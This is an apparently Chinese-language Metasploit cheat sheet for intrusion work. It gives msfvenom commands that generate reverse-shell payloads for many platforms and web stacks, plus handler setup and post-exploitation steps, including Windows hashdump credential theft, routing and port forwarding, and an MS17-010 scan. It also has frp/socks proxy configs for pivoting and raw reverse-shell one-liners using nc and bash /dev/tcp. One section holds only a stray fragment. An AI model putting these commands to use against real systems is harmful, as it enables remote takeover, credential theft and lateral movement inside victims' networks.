# MSF 一条龙



## Payload制作

### Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=12306 -f elf > shell.elf

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=12306 -f elf > shell.elf
```

### Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=12306  -f exe > meinv.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=12306  -f exe > meinv.exe
```

### Mac

```bash
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<Your IP Address> LPORT=12306-f macho > shell.machoWeb 
```

### PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=12306 -f raw > shell.php
```

### ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=12306 -f asp > shell.asp
```

### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=12306 -f raw > shell.jsp
```

### WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=12306 -f war > shell.war
```

### Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=12306 -f raw > shell.py
```

### Bash

```bash
vv
```

### Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=12306 -f raw > shell.pl
```

### 技巧

```bash
msfvenom -l payloads  #查看支持的payloads 
-i 10 								#生成payload带上-i 10表示对payload编码10次
```

## 反弹设置

```bash
#全局设置代理，似乎没手感 不推荐
#set proxies socks5:127.0.0.1:8080

#Payload值根据实际使用的payload填写
set exitonsession false
use exploits/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST VPSIP
set LPORT 12307
exploit -j

#获取session后设置路由
run post/multi/manage/autoroute
#获取各种hashdump（search），未知密码情况下hashdump可以用来横向登录其它主机

run post/windows/gather/hashdump
或
run post/windows/gather/smart_hashdump


#代理设置 感觉没有frp好用
use auxiliary/server/socks_proxy
#只是临时想看下内网服务可以做端口映射，很快、稳、也方便。
meterpreter > portfwd add -l 14448 -r 172.16.200.6 -p 3389

#设置好后根据前面的msf路由可以打攻击流量，跨网段的还是用proxychain启动msf打比较稳。
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.20.100.201
exploit
```

## 代理设置

### 代理服务frp
#### frpc

```bash
[common]
#remote vps addr
server_addr = vpsip 
server_port =  64447   
tls_enable = true 
pool_count = 5
 
[plugin_socks]
type = tcp 
remote_port = 54321 
plugin = socks5
use_encryption = true

[i]
type = tcp
local_ip = 127.0.0.1       
local_port = 3389
remote_port = 12346
```

#### frps

```bash
[common]
bind_addr = 0.0.0.0
bind_port = 64447 
 
dashboard_port = 7500
dashboard_user = admin1
```

### 代理服务**reGeorg**

```bash
参见Readme
```



### ssh代理访问

```
ssh -o "ProxyCommand nc -X 5 -x x.x.x.x:8888 %h %p" root@192.168.80.8

5 - socks5
```



### 代理客户端

#### proxychain4

```bash
#配置proxychain的代理连上frp，端口为54321
proxychain4 msfconsole
```

#### 浏览器

```bash
# 配置参数参考
sock5
ip vps
port 54321
# 注意 谷歌浏览器不支持带密码的sock5
```

## 其它

```bash
#简易版反连

# Linux vul机器
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 |nc IP 4444 >/tmp/f 
或
bash -i >& /dev/tcp/IP/4444 0>&1

# Window vul机器
nc ip 4444 -e c:\windows\system32\cmd.exe

#反弹机器
nc -lvp 4444
```

